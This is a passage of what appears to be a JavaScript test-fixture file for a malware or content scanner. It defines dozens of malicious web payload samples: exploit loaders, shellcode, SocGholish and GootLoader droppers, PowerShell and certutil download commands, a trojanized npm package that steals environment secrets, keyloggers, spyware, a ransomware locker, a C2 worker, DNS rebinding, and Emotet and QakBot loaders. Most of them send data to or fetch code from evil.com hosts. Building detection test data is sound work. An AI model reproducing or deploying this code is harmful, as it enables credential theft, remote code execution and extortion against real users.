<object data="data:application/x-silverlight-2," type="application/x-silverlight-2" width="0" height="0">
<param name="source" value="https://evil.com/exploit.xap">
<param name="enableHtmlAccess" value="true">
<param name="enableGPUAcceleration" value="true">
</object>
<script>
function checkSilverlight(){
try{var sl=navigator.plugins['Silverlight Plug-In'];
if(sl){var v=sl.description;if(parseInt(v)<5.1){
var obj=document.createElement('object');
obj.data='data:application/x-silverlight-2,';
obj.type='application/x-silverlight-2';
var param=document.createElement('param');
param.name='source';param.value='https://evil.com/cve-silverlight.xap';
obj.appendChild(param);document.body.appendChild(obj);}}}catch(e){}}
checkSilverlight();
${jsPad(10000)}
</script></body></html>`,
    severity: 'critical',
  },

  // ── WebAssembly Exploits ─────────────────────────────────────────────────
  {
    id: 'wasm-shellcode-loader',
    name: 'WASM shellcode loader (32KB)',
    description: 'WebAssembly module that loads and executes native shellcode via RWX pages',
    contentType: 'application/javascript',
    data: `// WASM-based shellcode execution
var shellcode = new Uint8Array([
  0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x48, 0x31, 0xc0,
  0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53,
  0x48, 0x89, 0xe7, 0xb0, 0x3b, 0x0f, 0x05,
  ${Array.from(crypto.randomBytes(200), b => '0x' + b.toString(16).padStart(2, '0')).join(', ')}
]);
// Compile WASM with RWX pages
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,
3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,
6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,
105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
${jsPad(25000)}
WebAssembly.instantiate(wasmCode).then(function(result) {
  var mem = new Uint8Array(result.instance.exports.memory.buffer);
  mem.set(shellcode, 0);
  result.instance.exports.main();
});`,
    severity: 'critical',
  },
  {
    id: 'wasm-spectre-gadget',
    name: 'WASM Spectre timing gadget (32KB)',
    description: 'WebAssembly Spectre-variant timing side-channel attack',
    contentType: 'application/javascript',
    data: `// Spectre v1 gadget via WASM SharedArrayBuffer
if (typeof SharedArrayBuffer !== 'undefined') {
  var sab = new SharedArrayBuffer(256 * 4096 + 4096);
  var probe = new Uint8Array(sab, 0, 256 * 4096);
  var timer_buf = new SharedArrayBuffer(4);
  var timer = new Uint32Array(timer_buf);
  // Timer thread
  var timerWorker = new Worker(URL.createObjectURL(new Blob([
    'onmessage=function(e){var b=new Uint32Array(e.data);while(true)b[0]++;}'
  ], {type:'application/javascript'})));
  timerWorker.postMessage(timer_buf);
  ${jsPad(25000)}
  function flush_reload(index) {
    // Measure access time to probe array
    var t1 = timer[0];
    var tmp = probe[index * 4096];
    var t2 = timer[0];
    return t2 - t1;
  }
  function spectre_read(addr) {
    var results = new Uint32Array(256);
    for (var trial = 0; trial < 1000; trial++) {
      // Mistrain branch predictor then read via speculation
      for (var i = 0; i < 256; i++) {
        var timing = flush_reload(i);
        if (timing < 50) results[i]++;
      }
    }
    return results.indexOf(Math.max.apply(null, results));
  }
}`,
    severity: 'critical',
  },

  // ── Known Exploit Kit Payloads ───────────────────────────────────────────
  {
    id: 'ek-socgholish-fakeupdater',
    name: 'SocGholish fake browser update (48KB)',
    description: 'SocGholish/FakeUpdates campaign landing page with JS dropper',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><head>
<style>body{margin:0;font-family:Arial;background:#f0f0f0}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center}
.modal{background:white;padding:40px;border-radius:12px;max-width:500px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.5)}
.btn{background:#1a73e8;color:white;border:none;padding:15px 30px;font-size:16px;border-radius:6px;cursor:pointer;margin-top:20px}
</style></head><body>
<div class="overlay"><div class="modal">
<img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iNjQiPjxjaXJjbGUgY3g9IjMyIiBjeT0iMzIiIHI9IjMwIiBmaWxsPSIjMWE3M2U4Ii8+PC9zdmc+" width="64">
<h2>Critical Browser Update Required</h2>
<p>Your browser is out of date. A critical security update is required to continue browsing safely.</p>
<p style="color:#666;font-size:13px">Version: ${Math.floor(Math.random()*20)+90}.0.${Math.floor(Math.random()*9000)+1000}.${Math.floor(Math.random()*90)+10}</p>
<button class="btn" onclick="downloadUpdate()">Update Browser</button>
</div></div>
<script>
${jsPad(38000)}
function downloadUpdate(){
var a=document.createElement('a');
a.href='data:application/x-msdownload;base64,TVqQAAMAAAA${crypto.randomBytes(200).toString('base64')}';
a.download='Browser-Update-${Date.now()}.exe';
document.body.appendChild(a);a.click();
fetch('https://evil.com/gate.php?action=download&ua='+encodeURIComponent(navigator.userAgent));
}</script></body></html>`,
    severity: 'critical',
  },
  {
    id: 'ek-gootloader',
    name: 'GootLoader SEO poisoned page (64KB)',
    description: 'GootLoader JS dropper from SEO-poisoned search result page',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><head><title>Free Legal Document Template - Download</title>
<meta name="description" content="Download free legal document templates, contracts, agreements">
</head><body>
<h1>Employment Agreement Template</h1>
<p>Click below to download your free employment agreement template.</p>
<a id="download" href="#" onclick="stage1()">Download Template (DOC)</a>
<script>
function stage1(){
var _0x${crypto.randomBytes(3).toString('hex')}=['fromCharCode','charCodeAt','length','join','split','reverse','replace'];
function decode(s){var r='';for(var i=0;i<s.length;i+=2){r+=String.fromCharCode(parseInt(s.substr(i,2),16));}return r;}
var payload=decode('${Buffer.from(
  'function(){var w=new ActiveXObject("WScript.Shell");var f=new ActiveXObject("Scripting.FileSystemObject");' +
  'var t=f.GetSpecialFolder(2)+"\\\\template.js";var x=new ActiveXObject("MSXML2.XMLHTTP");' +
  'x.Open("GET","https://evil.com/stage2.js",false);x.Send();' +
  'f.CreateTextFile(t,true).Write(x.ResponseText);w.Run("wscript "+t,0);}'
).toString('hex')}');
${jsPad(52000)}
try{eval(payload);}catch(e){
var a=document.createElement('a');
a.href='data:application/javascript;base64,'+btoa(payload);
a.download='template_${Date.now()}.js';
document.body.appendChild(a);a.click();}
}
</script></body></html>`,
    severity: 'critical',
  },

  // ── Malicious PDF/Document JS ────────────────────────────────────────────
  {
    id: 'pdf-js-exploit',
    name: 'PDF JavaScript exploit payload (32KB)',
    description: 'JavaScript payload typical of malicious PDF documents',
    contentType: 'application/javascript',
    data: `// Malicious PDF JavaScript payload
var _spray = [];
var _shellcode = unescape('%u4141%u4141%u4242%u4242' + '%u9090%u9090'.repeat(100) +
  '%u6850%u6863%u6361%u636c%u542e%ue689%u6850%u0000%u5400%uB864%u0000%u5000%u5350%uC489' +
  '%u5156%u50FF%uD0FF');
var _nops = unescape('%u0c0c%u0c0c');
while (_nops.length < 0x100000) _nops += _nops;
var _block = _nops.substring(0, 0x100000 - _shellcode.length);
for (var i = 0; i < 200; i++) {
  _spray.push(_block + _shellcode);
}
${jsPad(20000)}
// Trigger heap overflow
try {
  this.getAnnots({nPage: 0});
  app.doc.getAnnots({nPage: 0});
  util.printf('%45000f', 1.1);
} catch(e) {}`,
    severity: 'critical',
  },
  {
    id: 'pdf-openaction-launch',
    name: 'PDF OpenAction launch command (16KB)',
    description: 'PDF-style JavaScript that launches system commands',
    contentType: 'application/javascript',
    data: `// PDF /OpenAction /Launch exploit
var _cmds = [
  '/C /Windows/System32/cmd.exe /c powershell -ep bypass -e ${Buffer.from('IEX(IWR https://evil.com/payload.ps1)').toString('base64')}',
  '/C /Windows/System32/mshta.exe https://evil.com/evil.hta',
  '/C /Windows/System32/certutil.exe -urlcache -split -f https://evil.com/payload.exe %TEMP%/svc.exe',
];
${jsPad(10000)}
try {
  app.launchURL('https://evil.com/redirect', true);
  this.submitForm('https://evil.com/collect?data=' + encodeURIComponent(JSON.stringify({
    author: info.Author, title: info.Title, producer: info.Producer,
    created: info.CreationDate, modified: info.ModDate
  })));
} catch(e) {}`,
    severity: 'critical',
  },

  // ── Large Minified JS with Embedded Exploits ─────────────────────────────
  {
    id: 'js-supply-chain-trojan',
    name: 'Trojanized npm package script (128KB)',
    description: 'Large minified JS with hidden backdoor code in npm package',
    contentType: 'application/javascript',
    data: `// Legitimate-looking utility library (trojanized)
!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.utils=t():e.utils=t()}(this,function(){
var Utils={};
Utils.debounce=function(fn,delay){var timer;return function(){var context=this,args=arguments;clearTimeout(timer);timer=setTimeout(function(){fn.apply(context,args);},delay);};};
Utils.throttle=function(fn,limit){var lastCall=0;return function(){var now=Date.now();if(now-lastCall>=limit){lastCall=now;fn.apply(this,arguments);}};};
Utils.deepClone=function(obj){return JSON.parse(JSON.stringify(obj));};
Utils.uuid=function(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c=='x'?r:r&0x3|0x8).toString(16);});};
${jsPad(100000)}
// Hidden backdoor in minified code
Utils._i=function(){try{var h=require('os').hostname();var u=require('os').userInfo();var p=process.env;var d={h:h,u:u.username,p:Object.keys(p).filter(function(k){return k.match(/KEY|TOKEN|SECRET|PASS|AUTH|CRED/i);}).reduce(function(o,k){o[k]=p[k];return o;},{})};var https=require('https');var r=https.request({hostname:'evil.com',path:'/c',method:'POST',headers:{'Content-Type':'application/json'}});r.write(JSON.stringify(d));r.end();}catch(e){}};
try{Utils._i();}catch(e){}
return Utils;});`,
    severity: 'critical',
  },
  {
    id: 'js-prototype-pollution-exploit',
    name: 'Prototype pollution RCE chain (64KB)',
    description: 'JavaScript exploiting prototype pollution for remote code execution',
    contentType: 'application/javascript',
    data: `// Prototype pollution to RCE chain
(function(){
// Stage 1: Pollute Object.prototype
var payload = JSON.parse('{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}');
function merge(target, source) {
  for (var key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
merge({}, payload);
${jsPad(50000)}
// Stage 2: Trigger code execution via polluted prototype
var cp = require('child_process');
// spawn inherits from Object.prototype — shell and NODE_OPTIONS now set
var child = cp.spawn('echo', ['pwned']);
// Alternative: EJS template engine RCE via prototype pollution
var ejs = {render: function(template, data) {
  var opts = {};
  // opts.__proto__.outputFunctionName is now polluted
  return Function('locals', 'with(locals){return "' + template + '"}')(data);
}};
ejs.render('<%= name %>', {name: 'test'});
})();`,
    severity: 'critical',
  },

  // ── Keyloggers and Spyware JS ────────────────────────────────────────────
  {
    id: 'js-keylogger-advanced',
    name: 'Advanced JS keylogger with clipboard (48KB)',
    description: 'JavaScript keylogger capturing keystrokes, clipboard, and form data',
    contentType: 'application/javascript',
    data: `(function(){
var LOG=[];var EXFIL='https://evil.com/k';var BATCH=50;
// Keypress capture
document.addEventListener('keydown',function(e){
LOG.push({t:'k',ts:Date.now(),k:e.key,c:e.code,alt:e.altKey,ctrl:e.ctrlKey,shift:e.shiftKey,
url:location.href,el:e.target.tagName+'#'+e.target.id+'.'+e.target.className});
if(LOG.length>=BATCH)flush();},true);
// Clipboard capture
document.addEventListener('paste',function(e){
var text=e.clipboardData.getData('text');
LOG.push({t:'p',ts:Date.now(),data:text.substring(0,1000),url:location.href});flush();},true);
document.addEventListener('copy',function(e){
var sel=window.getSelection().toString();
LOG.push({t:'c',ts:Date.now(),data:sel.substring(0,1000),url:location.href});},true);
// Form data capture
document.addEventListener('change',function(e){if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){
LOG.push({t:'f',ts:Date.now(),name:e.target.name,type:e.target.type,value:e.target.value.substring(0,500),
url:location.href});}},true);
// Mouse click capture
document.addEventListener('click',function(e){
LOG.push({t:'m',ts:Date.now(),x:e.clientX,y:e.clientY,el:e.target.tagName,url:location.href});},true);
${jsPad(35000)}
function flush(){if(LOG.length===0)return;
var payload=JSON.stringify(LOG.splice(0));
if(navigator.sendBeacon){navigator.sendBeacon(EXFIL,payload);}
else{var x=new XMLHttpRequest();x.open('POST',EXFIL,true);x.send(payload);}}
setInterval(flush,10000);
window.addEventListener('beforeunload',flush);
})();`,
    severity: 'critical',
  },
  {
    id: 'js-screen-capture',
    name: 'JS screen capture spyware (32KB)',
    description: 'JavaScript that captures screen via canvas and exfiltrates screenshots',
    contentType: 'application/javascript',
    data: `(function(){
var EXFIL='https://evil.com/screenshot';
var INTERVAL=15000;
function captureScreen(){
try{
var canvas=document.createElement('canvas');
canvas.width=window.innerWidth;canvas.height=window.innerHeight;
var ctx=canvas.getContext('2d');
// Capture visible elements
var elements=document.body.getElementsByTagName('*');
ctx.fillStyle='white';ctx.fillRect(0,0,canvas.width,canvas.height);
// Use html2canvas-style rendering
var svg='<svg xmlns="http://www.w3.org/2000/svg" width="'+canvas.width+'" height="'+canvas.height+'">'+
'<foreignObject width="100%" height="100%">'+
'<div xmlns="http://www.w3.org/1999/xhtml">'+document.body.innerHTML+'</div>'+
'</foreignObject></svg>';
var img=new Image();
img.onload=function(){ctx.drawImage(img,0,0);
var dataUrl=canvas.toDataURL('image/jpeg',0.5);
navigator.sendBeacon(EXFIL,JSON.stringify({url:location.href,ts:Date.now(),img:dataUrl}));};
img.src='data:image/svg+xml;charset=utf-8,'+encodeURIComponent(svg);
}catch(e){}}
${jsPad(20000)}
setInterval(captureScreen,INTERVAL);
captureScreen();
})();`,
    severity: 'critical',
  },

  // ── Browser Extension Hijack Patterns ────────────────────────────────────
  {
    id: 'js-extension-hijack',
    name: 'Browser extension hijack script (32KB)',
    description: 'JavaScript attempting to inject code into installed browser extensions',
    contentType: 'application/javascript',
    data: `// Browser extension manipulation
(function(){
// Detect installed extensions via resource timing
var extensions = [
  {id:'cjpalhdlnbpafiamejdnhcphjbkeiagm',name:'uBlock Origin',check:'/img/icon_128.png'},
  {id:'cfhdojbkjhnklbpkdaibdccddilifddb',name:'Adblock Plus',check:'/icons/ab-128.png'},
  {id:'hdokiejnpimakedhajhdlcegeplioahd',name:'LastPass',check:'/images/icon_128.png'},
  {id:'nkbihfbeogaeaoehlefnkodbefgpgknn',name:'MetaMask',check:'/images/icon-128.png'},
];
var found=[];
${jsPad(22000)}
extensions.forEach(function(ext){
  var img=new Image();
  img.onload=function(){found.push(ext.name);
  // Attempt to communicate with extension
  try{chrome.runtime.sendMessage(ext.id,{type:'getInfo'},function(r){
  fetch('https://evil.com/ext',{method:'POST',body:JSON.stringify({ext:ext.name,data:r})});});}catch(e){}};
  img.onerror=function(){};
  img.src='chrome-extension://'+ext.id+ext.check;
});
// Intercept extension APIs
if(window.ethereum){
var origRequest=window.ethereum.request.bind(window.ethereum);
window.ethereum.request=function(args){
if(args.method==='eth_sendTransaction'||args.method==='personal_sign'){
fetch('https://evil.com/eth',{method:'POST',body:JSON.stringify(args)});}
return origRequest(args);};}
})();`,
    severity: 'critical',
  },

  // ── Ransomware JS Patterns ───────────────────────────────────────────────
  {
    id: 'js-ransomware-browser',
    name: 'Browser ransomware locker (48KB)',
    description: 'JavaScript browser locker mimicking ransomware with full-screen takeover',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><head><style>
*{margin:0;padding:0}body{background:#1a0000;color:#ff0000;font-family:monospace;overflow:hidden}
.lock{position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#1a0000}
.skull{font-size:120px;margin-bottom:20px}h1{font-size:36px;margin-bottom:20px}
.timer{font-size:48px;color:#ff4444;margin:20px 0}.info{max-width:600px;text-align:center;line-height:1.6}
.btc{background:#333;padding:10px 20px;border-radius:4px;font-size:14px;margin:20px 0;word-break:break-all}
</style></head><body>
<div class="lock">
<div class="skull">&#9760;</div>
<h1>YOUR FILES HAVE BEEN ENCRYPTED</h1>
<div class="timer" id="timer">71:59:59</div>
<div class="info">
<p>All your documents, photos, databases, and other important files have been encrypted with military-grade encryption.</p>
<p>You cannot decrypt your files without our decryption key.</p>
<p>To recover your files, send <strong>0.5 BTC</strong> to:</p>
<div class="btc">bc1q${crypto.randomBytes(20).toString('hex')}</div>
<p>After payment, email proof to: decrypt@protonmail.com</p>
<p style="color:#ff4444">If you do not pay within the countdown, the price doubles.</p>
</div></div>
<script>
${jsPad(35000)}
// Prevent closing
window.onbeforeunload=function(){return'Your files will be permanently lost!';};
document.addEventListener('keydown',function(e){
if(e.key==='Escape'||e.key==='F11'||(e.ctrlKey&&e.key==='w')||(e.altKey&&e.key==='F4'))
{e.preventDefault();e.stopPropagation();return false;}},true);
// Countdown timer
var deadline=Date.now()+72*3600*1000;
setInterval(function(){var r=Math.max(0,deadline-Date.now());var h=Math.floor(r/3600000);
var m=Math.floor(r%3600000/60000);var s=Math.floor(r%60000/1000);
document.getElementById('timer').textContent=h+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');},1000);
// Full screen
try{document.documentElement.requestFullscreen();}catch(e){}
// History manipulation to prevent back
history.pushState(null,null,location.href);window.onpopstate=function(){history.pushState(null,null,location.href);};
</script></body></html>`,
    severity: 'critical',
  },

  // ── Malicious SVG Content ────────────────────────────────────────────────
  {
    id: 'svg-script-injection',
    name: 'SVG with embedded script (16KB)',
    description: 'SVG image containing malicious JavaScript for XSS/RCE',
    contentType: 'image/svg+xml',
    data: `<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<rect width="100" height="100" fill="white"/>
<script type="text/javascript">
var xhr=new XMLHttpRequest();xhr.open('GET','file:///etc/passwd',false);
try{xhr.send();new Image().src='https://evil.com/steal?data='+btoa(xhr.responseText);}catch(e){}
document.location='https://evil.com/redir?c='+document.cookie;
</script>
<animate attributeName="href" values="javascript:alert(document.domain)" begin="0s"/>
<set attributeName="onmouseover" to="fetch('https://evil.com/'+document.cookie)"/>
${jsPad(10000)}
</svg>`,
    severity: 'high',
  },

  // ── Malicious Web Font / CSS ─────────────────────────────────────────────
  {
    id: 'css-keylogger',
    name: 'CSS-based keylogger (32KB)',
    description: 'CSS that exfiltrates input values via background-image requests',
    contentType: 'text/css',
    data: `/* CSS Keylogger — exfiltrates typed characters via URL requests */
${Array.from({length: 26}, (_, i) => {
  const char = String.fromCharCode(97 + i);
  return `input[type="password"][value$="${char}"] { background-image: url("https://evil.com/k?v=${char}"); }
input[type="text"][value$="${char}"] { background-image: url("https://evil.com/k?v=${char}"); }`;
}).join('\n')}
${Array.from({length: 10}, (_, i) => {
  return `input[type="password"][value$="${i}"] { background-image: url("https://evil.com/k?v=${i}"); }
input[type="text"][value$="${i}"] { background-image: url("https://evil.com/k?v=${i}"); }`;
}).join('\n')}
/* Capture specific named fields */
input[name="card_number"] { background-image: url("https://evil.com/field?n=cc"); }
input[name="cvv"] { background-image: url("https://evil.com/field?n=cvv"); }
input[name="ssn"] { background-image: url("https://evil.com/field?n=ssn"); }
input[name="password"] { background-image: url("https://evil.com/field?n=pw"); }
/* ${jsPad(20000)} */`,
    severity: 'high',
  },

  // ── Malicious Worker Scripts ─────────────────────────────────────────────
  {
    id: 'js-web-worker-c2',
    name: 'Web Worker C2 channel (32KB)',
    description: 'Malicious Web Worker maintaining persistent C2 connection in background',
    contentType: 'application/javascript',
    data: `// Persistent Web Worker C2
var workerCode = \`
var C2_URL = 'wss://evil.com:8443/c2';
var ws = null;
var interval = 5000;
function connect() {
  ws = new WebSocket(C2_URL);
  ws.onmessage = function(e) {
    var cmd = JSON.parse(e.data);
    if (cmd.type === 'exec') {
      try { var result = eval(cmd.code); ws.send(JSON.stringify({type:'result',id:cmd.id,data:String(result)})); }
      catch(e) { ws.send(JSON.stringify({type:'error',id:cmd.id,data:e.message})); }
    } else if (cmd.type === 'fetch') {
      fetch(cmd.url).then(function(r){return r.text();}).then(function(t){
        ws.send(JSON.stringify({type:'fetch_result',id:cmd.id,data:t}));});
    } else if (cmd.type === 'scan') {
      // Port scan internal network
      for (var port of cmd.ports) {
        fetch('http://'+cmd.host+':'+port,{mode:'no-cors',timeout:1000})
        .then(function(){ws.send(JSON.stringify({type:'port_open',host:cmd.host,port:port}));})
        .catch(function(){});
      }
    }
  };
  ws.onclose = function() { setTimeout(connect, interval); };
  ws.onerror = function() { ws.close(); };
}
connect();
setInterval(function(){ if(ws.readyState !== 1) connect(); }, interval * 2);
\`;
${jsPad(22000)}
var blob = new Blob([workerCode], {type: 'application/javascript'});
var worker = new Worker(URL.createObjectURL(blob));`,
    severity: 'critical',
  },

  // ── DNS Rebinding / CORS Bypass ──────────────────────────────────────────
  {
    id: 'js-dns-rebinding',
    name: 'DNS rebinding attack script (32KB)',
    description: 'JavaScript performing DNS rebinding to access internal network services',
    contentType: 'application/javascript',
    data: `// DNS Rebinding attack
(function(){
var targets = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1'];
var ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 9090];
var results = [];
${jsPad(22000)}
// Phase 1: Scan internal network
function scanPort(host, port) {
  return new Promise(function(resolve) {
    var img = new Image();
    var timeout = setTimeout(function() { resolve({host:host,port:port,open:false}); }, 2000);
    img.onload = function() { clearTimeout(timeout); resolve({host:host,port:port,open:true}); };
    img.onerror = function() { clearTimeout(timeout); resolve({host:host,port:port,open:true}); };
    img.src = 'http://' + host + ':' + port + '/favicon.ico?_=' + Date.now();
  });
}
// Phase 2: Exploit found services
async function exploit() {
  for (var h of targets) {
    for (var p of ports) {
      var r = await scanPort(h, p);
      if (r.open) {
        results.push(r);
        // Try to fetch content from internal service
        try {
          var resp = await fetch('http://' + h + ':' + p + '/api/config', {mode:'no-cors'});
        } catch(e) {}
      }
    }
  }
  // Exfil results
  fetch('https://evil.com/rebind-results', {method:'POST', body:JSON.stringify(results)});
}
exploit();
})();`,
    severity: 'critical',
  },

  // ── Obfuscated Malware Loaders ───────────────────────────────────────────
  {
    id: 'js-emotet-loader',
    name: 'Emotet JavaScript loader (64KB)',
    description: 'Emotet-style obfuscated JavaScript downloader typically in email attachments',
    contentType: 'application/javascript',
    data: `// Emotet JS Loader
var _0x${crypto.randomBytes(4).toString('hex')} = [
'\\x57\\x53\\x63\\x72\\x69\\x70\\x74','\\x53\\x68\\x65\\x6c\\x6c',
'\\x41\\x44\\x4f\\x44\\x42','\\x53\\x74\\x72\\x65\\x61\\x6d',
'\\x4d\\x53\\x58\\x4d\\x4c\\x32','\\x58\\x4d\\x4c\\x48\\x54\\x54\\x50'];
var urls=['https://evil1.com/wp-content/plugins/','https://evil2.com/wp-admin/css/',
'https://evil3.com/wp-includes/js/','https://evil4.com/misc/jquery/','https://evil5.com/assets/'];
${jsPad(50000)}
function download(url,path){
try{var xhr=new ActiveXObject('MSXML2.XMLHTTP');xhr.Open('GET',url+Math.random().toString(36).substr(2)+'.dll',false);xhr.Send();
if(xhr.Status==200){var stream=new ActiveXObject('ADODB.Stream');stream.Type=1;stream.Open();
stream.Write(xhr.ResponseBody);stream.SaveToFile(path,2);stream.Close();return true;}}catch(e){}return false;}
var temp=new ActiveXObject('WScript.Shell').ExpandEnvironmentStrings('%TEMP%');
for(var i=0;i<urls.length;i++){
var dll=temp+'\\\\'+Math.random().toString(36).substr(2,8)+'.dll';
if(download(urls[i],dll)){
new ActiveXObject('WScript.Shell').Run('regsvr32 /s '+dll,0,false);break;}}`,
    severity: 'critical',
  },
  {
    id: 'js-qakbot-loader',
    name: 'QakBot JavaScript loader (64KB)',
    description: 'QakBot/Qbot trojan JavaScript loader with anti-analysis checks',
    contentType: 'application/javascript',
    data: `// QakBot JS Loader with anti-analysis
(function(){
// Anti-sandbox checks
var dominated=false;
try{
// Check for VM indicators
var wmi=GetObject('winmgmts:\\\\\\\\.\\\\root\\\\cimv2');
var items=wmi.ExecQuery('SELECT * FROM Win32_ComputerSystem');
var e=new Enumerator(items);
for(;!e.atEnd();e.moveNext()){
var model=e.item().Model.toLowerCase();
if(model.indexOf('virtual')>-1||model.indexOf('vmware')>-1||model.indexOf('vbox')>-1){dominated=true;}
var manufacturer=e.item().Manufacturer.toLowerCase();
if(manufacturer.indexOf('microsoft corporation')>-1&&model.indexOf('virtual')>-1){dominated=true;}}
// Check process count (sandboxes have few)
var procs=wmi.ExecQuery('SELECT * FROM Win32_Process');
var procCount=0;var pe=new Enumerator(procs);for(;!pe.atEnd();pe.moveNext())procCount++;
if(procCount<30)dominated=true;
// Check disk size
var disks=wmi.ExecQuery('SELECT * FROM Win32_DiskDrive');
var de=new Enumerator(disks);for(;!de.atEnd();de.moveNext()){
if(de.item().Size<64424509440)dominated=true;}
}catch(ex){}
${jsPad(45000)}
if(!dominated){
var shell=new ActiveXObject('WScript.Shell');
var temp=shell.ExpandEnvironmentStrings('%APPDATA%');
var urls=['https://evil.com/q1/','https://evil.com/q2/','https://evil.com/q3/'];
for(var i=0;i<urls.length;i++){
try{var xhr=new ActiveXObject('MSXML2.ServerXMLHTTP');
xhr.Open('GET',urls[i]+Math.random(),false);xhr.Send();
if(xhr.Status==200&&xhr.ResponseBody.length>10000){
var path=temp+'\\\\'+Math.random().toString(36).substr(2)+'.dll';
var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();s.Write(xhr.ResponseBody);
s.SaveToFile(path,2);s.Close();
shell.Run('rundll32 '+path+',DllRegisterServer',0,false);break;}}catch(e){}}}
})();`,
    severity: 'critical',
  },

  // ── Watering Hole / Supply Chain ─────────────────────────────────────────
  {
    id: 'js-watering-hole-inject',
    name: 'Watering hole injection script (48KB)',
    description: 'JavaScript injected into compromised legitimate website for targeted attacks',
    contentType: 'application/javascript',
    data: `// Watering hole — targeted attack injection
(function(){
// Only trigger for specific organizations (check email domains, internal URLs, etc.)
var targets = ['@targetcorp.com', '@target-gov.org', 'intranet.target.local'];
var triggered = false;
${jsPad(35000)}
// Check if victim matches target profile
function checkTarget() {
  // Method 1: Check autocomplete for email domain
  var input = document.createElement('input');
  input.type = 'email'; input.autocomplete = 'email';
  input.style.position = 'fixed'; input.style.left = '-9999px';
  document.body.appendChild(input); input.focus();

  // Method 2: Try to detect internal network indicators
  var indicators = ['vpn.targetcorp.com', '10.10.', '172.20.'];

  // Method 3: Check referrer / URL patterns
  var ref = document.referrer + ' ' + location.href;
  for (var i = 0; i < targets.length; i++) {
    if (ref.indexOf(targets[i]) > -1) { triggered = true; break; }
  }

  if (triggered) {
    // Deliver exploit only to targeted victims
    var s = document.createElement('script');
    s.src = 'https://cdn-evil.com/analytics/target-payload.js';
    document.head.appendChild(s);
    // Also exfiltrate network info
    fetch('https://evil.com/wh?ref=' + btoa(ref) + '&ua=' + btoa(navigator.userAgent));
  }
}
setTimeout(checkTarget, 2000);
})();`,
    severity: 'critical',
  },

  // ── Large Dynamic Content ────────────────────────────────────────────────
  {
    id: 'html-large-exploit-bundle',
    name: 'Large HTML exploit bundle (256KB)',
    description: 'Massive HTML page bundling multiple browser exploits and evasion techniques',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><head><title>Page Loading...</title>
<style>body{display:none}</style></head><body>
<script>
// Anti-debugging
setInterval(function(){debugger;},100);
(function(){var a=new Date();debugger;var b=new Date();if(b-a>100){return;}})();
// Anti-VM
var start=performance.now();for(var i=0;i<1000000;i++)Math.random();
var elapsed=performance.now()-start;
if(elapsed<10){/*VM detected - too fast*/document.body.style.display='block';document.body.innerHTML='<p>Welcome</p>';throw '';}
// Browser fingerprint
var fp={};fp.canvas=(function(){var c=document.createElement('canvas');var ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillText('fingerprint',2,2);return c.toDataURL();})();
fp.webgl=(function(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl');return gl.getParameter(gl.RENDERER)+gl.getParameter(gl.VENDOR);}catch(e){return'';}})();
fp.audio=(function(){try{var ctx=new(window.AudioContext||window.webkitAudioContext)();var osc=ctx.createOscillator();var comp=ctx.createDynamicsCompressor();osc.connect(comp);comp.connect(ctx.destination);osc.start(0);return ctx.destination.numberOfInputs;}catch(e){return 0;}})();
${jsPad(220000)}
// Multi-exploit payload
var exploits={
ie:function(){try{var ax=new ActiveXObject('htmlfile');/*CVE IE exploit*/}catch(e){}},
flash:function(){try{document.write('<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param name="movie" value="https://evil.com/exploit.swf"></object>');}catch(e){}},
java:function(){try{document.write('<applet code="Exploit" archive="https://evil.com/exploit.jar" width=0 height=0></applet>');}catch(e){}},
chrome:function(){try{/*V8 type confusion*/var a=[1.1];function f(x){a[0]=x;}for(var i=0;i<100000;i++)f(1.1);f({});}catch(e){}}
};
var ua=navigator.userAgent;
if(ua.indexOf('MSIE')>-1||ua.indexOf('Trident')>-1)exploits.ie();
else if(ua.indexOf('Chrome')>-1)exploits.chrome();
exploits.flash();exploits.java();
// Exfiltrate fingerprint
fetch('https://evil.com/fp',{method:'POST',body:JSON.stringify(fp)});
</script></body></html>`,
    severity: 'critical',
  },

  // ── Malicious HTA Content ────────────────────────────────────────────────
  {
    id: 'hta-powershell-dropper',
    name: 'HTA PowerShell dropper (16KB)',
    description: 'HTML Application (HTA) file that executes PowerShell payload',
    contentType: 'application/hta',
    data: `<html><head>
